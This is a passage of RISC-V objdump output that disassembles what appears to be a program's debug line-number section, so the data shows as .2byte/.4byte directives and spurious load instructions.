     342:	000c                	.2byte	0xc
     344:	0100                	.2byte	0x100
     346:	aa01                	.2byte	0xaa01
     348:	000e                	.2byte	0xe
     34a:	0500                	.2byte	0x500
     34c:	0800                	.2byte	0x800
     34e:	6500                	.2byte	0x6500
     350:	0000                	.2byte	0x0
     352:	0100                	.2byte	0x100
     354:	0101                	.2byte	0x101
     356:	000d0efb          	.4byte	0xd0efb
     35a:	0101                	.2byte	0x101
     35c:	0101                	.2byte	0x101
     35e:	0000                	.2byte	0x0
     360:	0100                	.2byte	0x100
     362:	0000                	.2byte	0x0
     364:	0101                	.2byte	0x101
     366:	1f01                	.2byte	0x1f01
     368:	00000007          	.4byte	0x7
     36c:	3600                	.2byte	0x3600
     36e:	0000                	.2byte	0x0
     370:	f000                	.2byte	0xf000
     372:	0000                	.2byte	0x0
     374:	f400                	.2byte	0xf400
     376:	0000                	.2byte	0x0
     378:	4c00                	.2byte	0x4c00
     37a:	0000                	.2byte	0x0
     37c:	8b00                	.2byte	0x8b00
     37e:	0000                	.2byte	0x0
     380:	2b00                	.2byte	0x2b00
     382:	0001                	.2byte	0x1
     384:	0200                	.2byte	0x200
     386:	1f01                	.2byte	0x1f01
     388:	0f02                	.2byte	0xf02
     38a:	e509                	.2byte	0xe509
     38c:	0000                	.2byte	0x0
     38e:	0100                	.2byte	0x100
     390:	0171                	.2byte	0x171
     392:	0000                	.2byte	0x0
     394:	e502                	.2byte	0xe502
     396:	0000                	.2byte	0x0
     398:	0100                	.2byte	0x100
     39a:	0178                	.2byte	0x178
     39c:	0000                	.2byte	0x0
     39e:	0000c603          	lbu	a2,0(ra)
     3a2:	0400                	.2byte	0x400
     3a4:	000000d7          	.4byte	0xd7
     3a8:	8005                	.2byte	0x8005
     3aa:	0001                	.2byte	0x1
     3ac:	0600                	.2byte	0x600
     3ae:	0189                	.2byte	0x189
     3b0:	0000                	.2byte	0x0
     3b2:	9206                	.2byte	0x9206
     3b4:	0001                	.2byte	0x1
     3b6:	0300                	.2byte	0x300
     3b8:	0105                	.2byte	0x105
     3ba:	0900                	.2byte	0x900
     3bc:	a002                	.2byte	0xa002
     3be:	0010                	.2byte	0x10
     3c0:	0080                	.2byte	0x80
     3c2:	0000                	.2byte	0x0
     3c4:	0300                	.2byte	0x300
     3c6:	0128                	.2byte	0x128
     3c8:	1c090803          	lb	a6,448(s2)
     3cc:	0100                	.2byte	0x100
     3ce:	10090303          	lb	t1,256(s2)
     3d2:	0100                	.2byte	0x100
     3d4:	1c090803          	lb	a6,448(s2)
     3d8:	0100                	.2byte	0x100
     3da:	10090303          	lb	t1,256(s2)
     3de:	0100                	.2byte	0x100
     3e0:	0a05                	.2byte	0xa05
     3e2:	1c090303          	lb	t1,448(s2)
     3e6:	0100                	.2byte	0x100
     3e8:	0305                	.2byte	0x305
     3ea:	04090003          	lb	zero,64(s2)
     3ee:	0100                	.2byte	0x100
     3f0:	1205                	.2byte	0x1205
     3f2:	04090203          	lb	tp,64(s2)
     3f6:	0100                	.2byte	0x100
     3f8:	0905                	.2byte	0x905
     3fa:	10090003          	lb	zero,256(s2)
     3fe:	0100                	.2byte	0x100
     400:	2005                	.2byte	0x2005
     402:	08090003          	lb	zero,128(s2)
     406:	0100                	.2byte	0x100
     408:	1705                	.2byte	0x1705
     40a:	14090003          	lb	zero,320(s2)
     40e:	0100                	.2byte	0x100
     410:	1405                	.2byte	0x1405
     412:	08090103          	lb	sp,128(s2)
     416:	0100                	.2byte	0x100
     418:	0905                	.2byte	0x905
     41a:	10090003          	lb	zero,256(s2)
     41e:	0100                	.2byte	0x100
     420:	2405                	.2byte	0x2405
     422:	08090003          	lb	zero,128(s2)
     426:	0100                	.2byte	0x100
     428:	1905                	.2byte	0x1905
     42a:	14090003          	lb	zero,320(s2)
     42e:	0100                	.2byte	0x100
     430:	0805                	.2byte	0x805
     432:	08090103          	lb	sp,128(s2)
     436:	0100                	.2byte	0x100
     438:	1b05                	.2byte	0x1b05
     43a:	0200                	.2byte	0x200
     43c:	0104                	.2byte	0x104
     43e:	18090003          	lb	zero,384(s2)
     442:	0100                	.2byte	0x100
     444:	0805                	.2byte	0x805
     446:	10090103          	lb	sp,256(s2)
     44a:	0100                	.2byte	0x100
     44c:	1b05                	.2byte	0x1b05
     44e:	0200                	.2byte	0x200
     450:	0104                	.2byte	0x104
     452:	18090003          	lb	zero,384(s2)
     456:	0100                	.2byte	0x100
     458:	0200                	.2byte	0x200
     45a:	0204                	.2byte	0x204
     45c:	10097b03          	.4byte	0x10097b03
     460:	0100                	.2byte	0x100
     462:	1405                	.2byte	0x1405
     464:	0200                	.2byte	0x200
     466:	0104                	.2byte	0x104
     468:	0c090003          	lb	zero,192(s2)
     46c:	0100                	.2byte	0x100
     46e:	1605                	.2byte	0x1605
     470:	0200                	.2byte	0x200
     472:	0104                	.2byte	0x104
     474:	14090003          	lb	zero,320(s2)
     478:	0100                	.2byte	0x100
     47a:	1105                	.2byte	0x1105
     47c:	0200                	.2byte	0x200
     47e:	0104                	.2byte	0x104
     480:	08090003          	lb	zero,128(s2)
     484:	0100                	.2byte	0x100
     486:	0d05                	.2byte	0xd05
     488:	0c090703          	lb	a4,192(s2)
     48c:	0100                	.2byte	0x100
     48e:	0605                	.2byte	0x605
     490:	0c090003          	lb	zero,192(s2)
     494:	0100                	.2byte	0x100
     496:	1905                	.2byte	0x1905
     498:	0200                	.2byte	0x200
     49a:	0104                	.2byte	0x104
     49c:	04090003          	lb	zero,64(s2)
     4a0:	0100                	.2byte	0x100
     4a2:	2805                	.2byte	0x2805
     4a4:	0200                	.2byte	0x200
     4a6:	0104                	.2byte	0x104
     4a8:	1c090003          	lb	zero,448(s2)
     4ac:	0100                	.2byte	0x100
     4ae:	1f05                	.2byte	0x1f05
     4b0:	0200                	.2byte	0x200
     4b2:	0104                	.2byte	0x104
     4b4:	14090003          	lb	zero,320(s2)
     4b8:	0100                	.2byte	0x100
     4ba:	1205                	.2byte	0x1205
     4bc:	0200                	.2byte	0x200
     4be:	0104                	.2byte	0x104
     4c0:	04090003          	lb	zero,64(s2)
     4c4:	0100                	.2byte	0x100
     4c6:	0c05                	.2byte	0xc05
     4c8:	08090103          	lb	sp,128(s2)
     4cc:	0100                	.2byte	0x100
     4ce:	0a05                	.2byte	0xa05
     4d0:	08090103          	lb	sp,128(s2)
     4d4:	0100                	.2byte	0x100
     4d6:	0105                	.2byte	0x105
     4d8:	04090103          	lb	sp,64(s2)
     4dc:	0100                	.2byte	0x100
     4de:	10090303          	lb	t1,256(s2)
     4e2:	0100                	.2byte	0x100
     4e4:	0a05                	.2byte	0xa05
     4e6:	1c090303          	lb	t1,448(s2)
     4ea:	0100                	.2byte	0x100
     4ec:	0305                	.2byte	0x305
     4ee:	04090003          	lb	zero,64(s2)
     4f2:	0100                	.2byte	0x100
     4f4:	1505                	.2byte	0x1505
     4f6:	04090203          	lb	tp,64(s2)
     4fa:	0100                	.2byte	0x100
     4fc:	0c05                	.2byte	0xc05
     4fe:	10090003          	lb	zero,256(s2)
     502:	0100                	.2byte	0x100
     504:	2305                	.2byte	0x2305
     506:	08090003          	lb	zero,128(s2)
     50a:	0100                	.2byte	0x100
     50c:	1a05                	.2byte	0x1a05
     50e:	14090003          	lb	zero,320(s2)
     512:	0100                	.2byte	0x100
     514:	1705                	.2byte	0x1705
     516:	08090103          	lb	sp,128(s2)
     51a:	0100                	.2byte	0x100
     51c:	0c05                	.2byte	0xc05
     51e:	10090003          	lb	zero,256(s2)
     522:	0100                	.2byte	0x100
     524:	2705                	.2byte	0x2705
     526:	08090003          	lb	zero,128(s2)
     52a:	0100                	.2byte	0x100
     52c:	1c05                	.2byte	0x1c05
     52e:	14090003          	lb	zero,320(s2)
     532:	0100                	.2byte	0x100
     534:	1205                	.2byte	0x1205
     536:	08090103          	lb	sp,128(s2)
     53a:	0100                	.2byte	0x100
     53c:	0905                	.2byte	0x905
     53e:	14090003          	lb	zero,320(s2)
     542:	0100                	.2byte	0x100
     544:	2205                	.2byte	0x2205
     546:	04090003          	lb	zero,64(s2)
     54a:	0100                	.2byte	0x100
     54c:	1905                	.2byte	0x1905
     54e:	14090003          	lb	zero,320(s2)
     552:	0100                	.2byte	0x100
     554:	0f05                	.2byte	0xf05
     556:	04090103          	lb	sp,64(s2)
     55a:	0100                	.2byte	0x100
     55c:	0805                	.2byte	0x805
     55e:	14090003          	lb	zero,320(s2)
     562:	0100                	.2byte	0x100
     564:	1f05                	.2byte	0x1f05
     566:	0200                	.2byte	0x200
     568:	0104                	.2byte	0x104
     56a:	04090003          	lb	zero,64(s2)
     56e:	0100                	.2byte	0x100
     570:	2105                	.2byte	0x2105
     572:	0200                	.2byte	0x200
     574:	0104                	.2byte	0x104
     576:	0c090003          	lb	zero,192(s2)
     57a:	0100                	.2byte	0x100
     57c:	1b05                	.2byte	0x1b05
     57e:	0200                	.2byte	0x200
     580:	0204                	.2byte	0x204
     582:	10097b03          	.4byte	0x10097b03
     586:	0100                	.2byte	0x100
     588:	1405                	.2byte	0x1405
     58a:	0200                	.2byte	0x200
     58c:	0104                	.2byte	0x104
     58e:	0c090003          	lb	zero,192(s2)
     592:	0100                	.2byte	0x100
     594:	1605                	.2byte	0x1605
     596:	0200                	.2byte	0x200
     598:	0104                	.2byte	0x104
     59a:	14090003          	lb	zero,320(s2)
     59e:	0100                	.2byte	0x100
     5a0:	1105                	.2byte	0x1105
     5a2:	0200                	.2byte	0x200
     5a4:	0104                	.2byte	0x104
     5a6:	08090003          	lb	zero,128(s2)
     5aa:	0100                	.2byte	0x100
     5ac:	0d05                	.2byte	0xd05
     5ae:	0c090703          	lb	a4,192(s2)
     5b2:	0100                	.2byte	0x100
     5b4:	0605                	.2byte	0x605
     5b6:	0c090003          	lb	zero,192(s2)
     5ba:	0100                	.2byte	0x100
     5bc:	1905                	.2byte	0x1905
     5be:	0200                	.2byte	0x200
     5c0:	0104                	.2byte	0x104
     5c2:	04090003          	lb	zero,64(s2)
     5c6:	0100                	.2byte	0x100
     5c8:	2805                	.2byte	0x2805
     5ca:	0200                	.2byte	0x200
     5cc:	0104                	.2byte	0x104
     5ce:	18090003          	lb	zero,384(s2)
     5d2:	0100                	.2byte	0x100
     5d4:	1205                	.2byte	0x1205
     5d6:	0200                	.2byte	0x200
     5d8:	0104                	.2byte	0x104
     5da:	18090003          	lb	zero,384(s2)
     5de:	0100                	.2byte	0x100
     5e0:	0c05                	.2byte	0xc05
     5e2:	08090103          	lb	sp,128(s2)
     5e6:	0100                	.2byte	0x100
     5e8:	0a05                	.2byte	0xa05
     5ea:	08090103          	lb	sp,128(s2)
     5ee:	0100                	.2byte	0x100
     5f0:	0105                	.2byte	0x105
     5f2:	04090103          	lb	sp,64(s2)
     5f6:	0100                	.2byte	0x100
     5f8:	10090303          	lb	t1,256(s2)
     5fc:	0100                	.2byte	0x100
     5fe:	0305                	.2byte	0x305
     600:	14090503          	lb	a0,320(s2)
     604:	0100                	.2byte	0x100
     606:	1105                	.2byte	0x1105
     608:	04090203          	lb	tp,64(s2)
     60c:	0100                	.2byte	0x100
     60e:	0f05                	.2byte	0xf05
     610:	10090003          	lb	zero,256(s2)
     614:	0100                	.2byte	0x100
     616:	0705                	.2byte	0x705
     618:	04090103          	lb	sp,64(s2)
     61c:	0100                	.2byte	0x100
     61e:	3005                	.2byte	0x3005
     620:	1c090003          	lb	zero,448(s2)
     624:	0100                	.2byte	0x100
     626:	0605                	.2byte	0x605
     628:	0c090003          	lb	zero,192(s2)
     62c:	0100                	.2byte	0x100
     62e:	0b05                	.2byte	0xb05
     630:	04090203          	lb	tp,64(s2)
     634:	0100                	.2byte	0x100
     636:	0c090103          	lb	sp,192(s2)
     63a:	0100                	.2byte	0x100
     63c:	0d05                	.2byte	0xd05
     63e:	14090203          	lb	tp,320(s2)
     642:	0100                	.2byte	0x100
     644:	1405                	.2byte	0x1405
     646:	0200                	.2byte	0x200
     648:	0104                	.2byte	0x104
     64a:	04090003          	lb	zero,64(s2)
     64e:	0100                	.2byte	0x100
     650:	0305                	.2byte	0x305
     652:	18090303          	lb	t1,384(s2)
     656:	0100                	.2byte	0x100
     658:	0105                	.2byte	0x105
     65a:	04090103          	lb	sp,64(s2)
     65e:	0100                	.2byte	0x100
     660:	10090303          	lb	t1,256(s2)
     664:	0100                	.2byte	0x100
     666:	1a05                	.2byte	0x1a05
     668:	10090103          	lb	sp,256(s2)
     66c:	0100                	.2byte	0x100
     66e:	1505                	.2byte	0x1505
     670:	08090003          	lb	zero,128(s2)
     674:	0100                	.2byte	0x100
     676:	0c05                	.2byte	0xc05
     678:	08090003          	lb	zero,128(s2)
     67c:	0100                	.2byte	0x100
     67e:	0d05                	.2byte	0xd05
     680:	08090103          	lb	sp,128(s2)
     684:	0100                	.2byte	0x100
     686:	1a05                	.2byte	0x1a05
     688:	08090003          	lb	zero,128(s2)
     68c:	0100                	.2byte	0x100
     68e:	1305                	.2byte	0x1305
     690:	08090003          	lb	zero,128(s2)
     694:	0100                	.2byte	0x100
     696:	0105                	.2byte	0x105
     698:	04090103          	lb	sp,64(s2)
     69c:	0100                	.2byte	0x100
     69e:	10090303          	lb	t1,256(s2)
     6a2:	0100                	.2byte	0x100
     6a4:	1b05                	.2byte	0x1b05
     6a6:	10090103          	lb	sp,256(s2)
     6aa:	0100                	.2byte	0x100
     6ac:	1605                	.2byte	0x1605
     6ae:	08090003          	lb	zero,128(s2)
     6b2:	0100                	.2byte	0x100
     6b4:	0c05                	.2byte	0xc05
     6b6:	08090003          	lb	zero,128(s2)
     6ba:	0100                	.2byte	0x100
     6bc:	0d05                	.2byte	0xd05
     6be:	08090103          	lb	sp,128(s2)
     6c2:	0100                	.2byte	0x100
     6c4:	1c05                	.2byte	0x1c05
     6c6:	08090003          	lb	zero,128(s2)
     6ca:	0100                	.2byte	0x100
     6cc:	1405                	.2byte	0x1405
     6ce:	08090003          	lb	zero,128(s2)
     6d2:	0100                	.2byte	0x100
     6d4:	0105                	.2byte	0x105
     6d6:	04090103          	lb	sp,64(s2)
     6da:	0100                	.2byte	0x100
     6dc:	0204                	.2byte	0x204
     6de:	097f9703          	lh	a4,151(t6)
     6e2:	0010                	.2byte	0x10
     6e4:	0501                	.2byte	0x501
     6e6:	0310                	.2byte	0x310
     6e8:	0902                	.2byte	0x902
     6ea:	0038                	.2byte	0x38
     6ec:	0301                	.2byte	0x301
     6ee:	0901                	.2byte	0x901
     6f0:	0008                	.2byte	0x8
     6f2:	0301                	.2byte	0x301
     6f4:	0901                	.2byte	0x901
     6f6:	0008                	.2byte	0x8
     6f8:	0301                	.2byte	0x301
     6fa:	0901                	.2byte	0x901
     6fc:	0008                	.2byte	0x8
     6fe:	0501                	.2byte	0x501
     700:	09010303          	lb	t1,144(sp)
     704:	0008                	.2byte	0x8
     706:	0501                	.2byte	0x501
     708:	030c                	.2byte	0x30c
     70a:	0902                	.2byte	0x902
     70c:	0004                	.2byte	0x4
     70e:	0501                	.2byte	0x501
     710:	030a                	.2byte	0x30a
     712:	0900                	.2byte	0x900
     714:	0004                	.2byte	0x4
     716:	0501                	.2byte	0x501
     718:	0309                	.2byte	0x309
     71a:	0901                	.2byte	0x901
     71c:	000c                	.2byte	0xc
     71e:	0501                	.2byte	0x501
     720:	04020013          	add	zero,tp,64 # 40 <buf.4>
     724:	0301                	.2byte	0x301
     726:	0900                	.2byte	0x900
     728:	0004                	.2byte	0x4
     72a:	0501                	.2byte	0x501
     72c:	030c                	.2byte	0x30c
     72e:	0902                	.2byte	0x902
     730:	0010                	.2byte	0x10
     732:	0501                	.2byte	0x501
     734:	09020303          	lb	t1,144(tp) # 90 <threadsense.2+0xc>
     738:	000c                	.2byte	0xc
     73a:	0501                	.2byte	0x501
     73c:	09010313          	add	t1,sp,144
     740:	0004                	.2byte	0x4
     742:	0501                	.2byte	0x501
     744:	0301                	.2byte	0x301
     746:	0901                	.2byte	0x901
     748:	0004                	.2byte	0x4
     74a:	0301                	.2byte	0x301
     74c:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     750:	0501                	.2byte	0x501
     752:	0312                	.2byte	0x312
     754:	0901                	.2byte	0x901
     756:	0010                	.2byte	0x10
     758:	0501                	.2byte	0x501
     75a:	0318                	.2byte	0x318
     75c:	0900                	.2byte	0x900
     75e:	0008                	.2byte	0x8
     760:	0501                	.2byte	0x501
     762:	030a                	.2byte	0x30a
     764:	0900                	.2byte	0x900
     766:	0004                	.2byte	0x4
     768:	0501                	.2byte	0x501
     76a:	0009                	.2byte	0x9
     76c:	0402                	.2byte	0x402
     76e:	0301                	.2byte	0x301
     770:	0901                	.2byte	0x901
     772:	000c                	.2byte	0xc
     774:	0501                	.2byte	0x501
     776:	0301                	.2byte	0x301
     778:	0904                	.2byte	0x904
     77a:	0008                	.2byte	0x8
     77c:	0501                	.2byte	0x501
     77e:	09010303          	lb	t1,144(sp)
     782:	001c                	.2byte	0x1c
     784:	0501                	.2byte	0x501
     786:	0301                	.2byte	0x301
     788:	0904                	.2byte	0x904
     78a:	0008                	.2byte	0x8
     78c:	0501                	.2byte	0x501
     78e:	09010303          	lb	t1,144(sp)
     792:	0018                	.2byte	0x18
     794:	0501                	.2byte	0x501
     796:	0301                	.2byte	0x301
     798:	0904                	.2byte	0x904
     79a:	000c                	.2byte	0xc
     79c:	0501                	.2byte	0x501
     79e:	09010303          	lb	t1,144(sp)
     7a2:	0010                	.2byte	0x10
     7a4:	0501                	.2byte	0x501
     7a6:	0301                	.2byte	0x301
     7a8:	0904                	.2byte	0x904
     7aa:	0008                	.2byte	0x8
     7ac:	0501                	.2byte	0x501
     7ae:	09010303          	lb	t1,144(sp)
     7b2:	0018                	.2byte	0x18
     7b4:	0501                	.2byte	0x501
     7b6:	0301                	.2byte	0x301
     7b8:	0901                	.2byte	0x901
     7ba:	0024                	.2byte	0x24
     7bc:	0301                	.2byte	0x301
     7be:	00180913          	add	s2,a6,1
     7c2:	0501                	.2byte	0x501
     7c4:	030d                	.2byte	0x30d
     7c6:	0904                	.2byte	0x904
     7c8:	0018                	.2byte	0x18
     7ca:	0501                	.2byte	0x501
     7cc:	0311                	.2byte	0x311
     7ce:	0900                	.2byte	0x900
     7d0:	0010                	.2byte	0x10
     7d2:	0501                	.2byte	0x501
     7d4:	0306                	.2byte	0x306
     7d6:	0902                	.2byte	0x902
     7d8:	0014                	.2byte	0x14
     7da:	0501                	.2byte	0x501
     7dc:	001c                	.2byte	0x1c
     7de:	0402                	.2byte	0x402
     7e0:	0301                	.2byte	0x301
     7e2:	0900                	.2byte	0x900
     7e4:	0010                	.2byte	0x10
     7e6:	0501                	.2byte	0x501
     7e8:	0012                	.2byte	0x12
     7ea:	0402                	.2byte	0x402
     7ec:	0301                	.2byte	0x301
     7ee:	0900                	.2byte	0x900
     7f0:	0004                	.2byte	0x4
     7f2:	0501                	.2byte	0x501
     7f4:	0305                	.2byte	0x305
     7f6:	0902                	.2byte	0x902
     7f8:	000c                	.2byte	0xc
     7fa:	0501                	.2byte	0x501
     7fc:	030c                	.2byte	0x30c
     7fe:	0901                	.2byte	0x901
     800:	001c                	.2byte	0x1c
     802:	0501                	.2byte	0x501
     804:	030a                	.2byte	0x30a
     806:	00040903          	lb	s2,0(s0)
     80a:	0501                	.2byte	0x501
     80c:	0301                	.2byte	0x301
     80e:	0901                	.2byte	0x901
     810:	0004                	.2byte	0x4
     812:	0301                	.2byte	0x301
     814:	00140903          	lb	s2,1(s0)
     818:	0501                	.2byte	0x501
     81a:	030a                	.2byte	0x30a
     81c:	00140903          	lb	s2,1(s0)
     820:	0501                	.2byte	0x501
     822:	09000303          	lb	t1,144(zero) # 90 <threadsense.2+0xc>
     826:	0004                	.2byte	0x4
     828:	0501                	.2byte	0x501
     82a:	0314                	.2byte	0x314
     82c:	0902                	.2byte	0x902
     82e:	0004                	.2byte	0x4
     830:	0501                	.2byte	0x501
     832:	0321                	.2byte	0x321
     834:	0900                	.2byte	0x900
     836:	0010                	.2byte	0x10
     838:	0501                	.2byte	0x501
     83a:	0900031b          	addw	t1,zero,144
     83e:	0008                	.2byte	0x8
     840:	0001                	.2byte	0x1
     842:	0402                	.2byte	0x402
     844:	0601                	.2byte	0x601
     846:	08090003          	lb	zero,128(s2)
     84a:	0100                	.2byte	0x100
     84c:	0200                	.2byte	0x200
     84e:	0204                	.2byte	0x204
     850:	08090003          	lb	zero,128(s2)
     854:	0100                	.2byte	0x100
     856:	0b05                	.2byte	0xb05
     858:	0200                	.2byte	0x200
     85a:	0404                	.2byte	0x404
     85c:	0306                	.2byte	0x306
     85e:	0900                	.2byte	0x900
     860:	0004                	.2byte	0x4
     862:	0501                	.2byte	0x501
     864:	0402001b          	addw	zero,tp,64 # 40 <buf.4>
     868:	0304                	.2byte	0x304
     86a:	0900                	.2byte	0x900
     86c:	0010                	.2byte	0x10
     86e:	0501                	.2byte	0x501
     870:	0402000f          	.4byte	0x402000f
     874:	0304                	.2byte	0x304
     876:	0900                	.2byte	0x900
     878:	0008                	.2byte	0x8
     87a:	0501                	.2byte	0x501
     87c:	04020007          	.4byte	0x4020007
     880:	0304                	.2byte	0x304
     882:	0901                	.2byte	0x901
     884:	000c                	.2byte	0xc
     886:	0501                	.2byte	0x501
     888:	0018                	.2byte	0x18
     88a:	0402                	.2byte	0x402
     88c:	0304                	.2byte	0x304
     88e:	097d                	.2byte	0x97d
     890:	000c                	.2byte	0xc
     892:	0501                	.2byte	0x501
     894:	0011                	.2byte	0x11
     896:	0402                	.2byte	0x402
     898:	0302                	.2byte	0x302
     89a:	0900                	.2byte	0x900
     89c:	000c                	.2byte	0xc
     89e:	0501                	.2byte	0x501
     8a0:	0905030b          	.4byte	0x905030b
     8a4:	0010                	.2byte	0x10
     8a6:	0501                	.2byte	0x501
     8a8:	09020303          	lb	t1,144(tp) # 90 <threadsense.2+0xc>
     8ac:	0004                	.2byte	0x4
     8ae:	0501                	.2byte	0x501
     8b0:	0301                	.2byte	0x301
     8b2:	0901                	.2byte	0x901
     8b4:	000c                	.2byte	0xc
     8b6:	0301                	.2byte	0x301
     8b8:	0904                	.2byte	0x904
     8ba:	0014                	.2byte	0x14
     8bc:	0501                	.2byte	0x501
     8be:	09020307          	.4byte	0x9020307
     8c2:	0040                	.2byte	0x40
     8c4:	0501                	.2byte	0x501
     8c6:	09040317          	auipc	t1,0x9040
     8ca:	0004                	.2byte	0x4
     8cc:	0501                	.2byte	0x501
     8ce:	030d                	.2byte	0x30d
     8d0:	0900                	.2byte	0x900
     8d2:	000c                	.2byte	0xc
     8d4:	0501                	.2byte	0x501
     8d6:	0311                	.2byte	0x311
     8d8:	0900                	.2byte	0x900
     8da:	000c                	.2byte	0xc
     8dc:	0501                	.2byte	0x501
     8de:	030d                	.2byte	0x30d
     8e0:	0901                	.2byte	0x901
     8e2:	0014                	.2byte	0x14
     8e4:	0501                	.2byte	0x501
     8e6:	0308                	.2byte	0x308
     8e8:	0900                	.2byte	0x900
     8ea:	0004                	.2byte	0x4
     8ec:	0501                	.2byte	0x501
     8ee:	0309                	.2byte	0x309
     8f0:	0902                	.2byte	0x902
     8f2:	0008                	.2byte	0x8
     8f4:	0501                	.2byte	0x501
     8f6:	0311                	.2byte	0x311
     8f8:	097d                	.2byte	0x97d
     8fa:	0010                	.2byte	0x10
     8fc:	0501                	.2byte	0x501
     8fe:	09020307          	.4byte	0x9020307
     902:	0004                	.2byte	0x4
     904:	0501                	.2byte	0x501
     906:	0309                	.2byte	0x309
     908:	0904                	.2byte	0x904
     90a:	0004                	.2byte	0x4
     90c:	0501                	.2byte	0x501
     90e:	0305                	.2byte	0x305
     910:	0901                	.2byte	0x901
     912:	0004                	.2byte	0x4
     914:	0501                	.2byte	0x501
     916:	097f030f          	.4byte	0x97f030f
     91a:	0014                	.2byte	0x14
     91c:	0501                	.2byte	0x501
     91e:	0312                	.2byte	0x312
     920:	0900                	.2byte	0x900
     922:	000c                	.2byte	0xc
     924:	0501                	.2byte	0x501
     926:	0309                	.2byte	0x309
     928:	000c0903          	lb	s2,0(s8)
     92c:	0501                	.2byte	0x501
     92e:	0901030f          	.4byte	0x901030f
     932:	0004                	.2byte	0x4
     934:	0501                	.2byte	0x501
     936:	031c                	.2byte	0x31c
     938:	0900                	.2byte	0x900
     93a:	0014                	.2byte	0x14
     93c:	0501                	.2byte	0x501
     93e:	09000333          	.4byte	0x9000333
     942:	0014                	.2byte	0x14
     944:	0001                	.2byte	0x1
     946:	0402                	.2byte	0x402
     948:	0601                	.2byte	0x601
     94a:	0c090003          	lb	zero,192(s2)
     94e:	0100                	.2byte	0x100
     950:	0200                	.2byte	0x200
     952:	0204                	.2byte	0x204
     954:	08090003          	lb	zero,128(s2)
     958:	0100                	.2byte	0x100
     95a:	1505                	.2byte	0x1505
     95c:	0200                	.2byte	0x200
     95e:	0404                	.2byte	0x404
     960:	0306                	.2byte	0x306
     962:	0900                	.2byte	0x900
     964:	0004                	.2byte	0x4
     966:	0501                	.2byte	0x501
     968:	0005                	.2byte	0x5
     96a:	0402                	.2byte	0x402
     96c:	0304                	.2byte	0x304
     96e:	0900                	.2byte	0x900
     970:	0008                	.2byte	0x8
     972:	0501                	.2byte	0x501
     974:	030d                	.2byte	0x30d
     976:	097f 0014 0501 0310 	.byte	0x7f, 0x09, 0x14, 0x00, 0x01, 0x05, 0x10, 0x03, 0x00, 0x09
     97e:	0900 
     980:	000c                	.2byte	0xc
     982:	0501                	.2byte	0x501
     984:	0301                	.2byte	0x301
     986:	0902                	.2byte	0x902
     988:	0004                	.2byte	0x4
     98a:	0301                	.2byte	0x301
     98c:	00180903          	lb	s2,1(a6)
     990:	0501                	.2byte	0x501
     992:	0306                	.2byte	0x306
     994:	0901                	.2byte	0x901
     996:	0018                	.2byte	0x18
     998:	0501                	.2byte	0x501
     99a:	030c                	.2byte	0x30c
     99c:	0901                	.2byte	0x901
     99e:	0010                	.2byte	0x10
     9a0:	0501                	.2byte	0x501
     9a2:	0901030b          	.4byte	0x901030b
     9a6:	001c                	.2byte	0x1c
     9a8:	0501                	.2byte	0x501
     9aa:	030c                	.2byte	0x30c
     9ac:	0901                	.2byte	0x901
     9ae:	000c                	.2byte	0xc
     9b0:	0301                	.2byte	0x301
     9b2:	0902                	.2byte	0x902
     9b4:	001c                	.2byte	0x1c
     9b6:	0501                	.2byte	0x501
     9b8:	0301                	.2byte	0x301
     9ba:	0901                	.2byte	0x901
     9bc:	0020                	.2byte	0x20
     9be:	0301                	.2byte	0x301
     9c0:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     9c4:	0501                	.2byte	0x501
     9c6:	0306                	.2byte	0x306
     9c8:	0901                	.2byte	0x901
     9ca:	0018                	.2byte	0x18
     9cc:	0501                	.2byte	0x501
     9ce:	030c                	.2byte	0x30c
     9d0:	0901                	.2byte	0x901
     9d2:	0010                	.2byte	0x10
     9d4:	0501                	.2byte	0x501
     9d6:	0901030b          	.4byte	0x901030b
     9da:	001c                	.2byte	0x1c
     9dc:	0501                	.2byte	0x501
     9de:	030c                	.2byte	0x30c
     9e0:	0901                	.2byte	0x901
     9e2:	000c                	.2byte	0xc
     9e4:	0301                	.2byte	0x301
     9e6:	0902                	.2byte	0x902
     9e8:	001c                	.2byte	0x1c
     9ea:	0501                	.2byte	0x501
     9ec:	0301                	.2byte	0x301
     9ee:	0901                	.2byte	0x901
     9f0:	0018                	.2byte	0x18
     9f2:	0301                	.2byte	0x301
     9f4:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     9f8:	0501                	.2byte	0x501
     9fa:	0909030b          	.4byte	0x909030b
     9fe:	0028                	.2byte	0x28
     a00:	0501                	.2byte	0x501
     a02:	030a                	.2byte	0x30a
     a04:	0901                	.2byte	0x901
     a06:	0004                	.2byte	0x4
     a08:	0301                	.2byte	0x301
     a0a:	0902                	.2byte	0x902
     a0c:	0004                	.2byte	0x4
     a0e:	0501                	.2byte	0x501
     a10:	09010307          	.4byte	0x9010307
     a14:	000c                	.2byte	0xc
     a16:	0501                	.2byte	0x501
     a18:	0312                	.2byte	0x312
     a1a:	097c                	.2byte	0x97c
     a1c:	0010                	.2byte	0x10
     a1e:	0501                	.2byte	0x501
     a20:	0310                	.2byte	0x310
     a22:	0900                	.2byte	0x900
     a24:	0008                	.2byte	0x8
     a26:	0501                	.2byte	0x501
     a28:	032a                	.2byte	0x32a
     a2a:	0900                	.2byte	0x900
     a2c:	0004                	.2byte	0x4
     a2e:	0501                	.2byte	0x501
     a30:	0308                	.2byte	0x308
     a32:	0906                	.2byte	0x906
     a34:	000c                	.2byte	0xc
     a36:	0501                	.2byte	0x501
     a38:	030e                	.2byte	0x30e
     a3a:	000c0903          	lb	s2,0(s8)
     a3e:	0501                	.2byte	0x501
     a40:	030a                	.2byte	0x30a
     a42:	0901                	.2byte	0x901
     a44:	0008                	.2byte	0x8
     a46:	0501                	.2byte	0x501
     a48:	0901030b          	.4byte	0x901030b
     a4c:	0008                	.2byte	0x8
     a4e:	0501                	.2byte	0x501
     a50:	0901030f          	.4byte	0x901030f
     a54:	0008                	.2byte	0x8
     a56:	0501                	.2byte	0x501
     a58:	0901030b          	.4byte	0x901030b
     a5c:	0008                	.2byte	0x8
     a5e:	0501                	.2byte	0x501
     a60:	030d                	.2byte	0x30d
     a62:	0901                	.2byte	0x901
     a64:	0004                	.2byte	0x4
     a66:	0501                	.2byte	0x501
     a68:	09270307          	.4byte	0x9270307
     a6c:	0008                	.2byte	0x8
     a6e:	0301                	.2byte	0x301
     a70:	0909                	.2byte	0x909
     a72:	0008                	.2byte	0x8
     a74:	0501                	.2byte	0x501
     a76:	09520313          	add	t1,tp,149 # 95 <threadsense.2+0x11>
     a7a:	0004                	.2byte	0x4
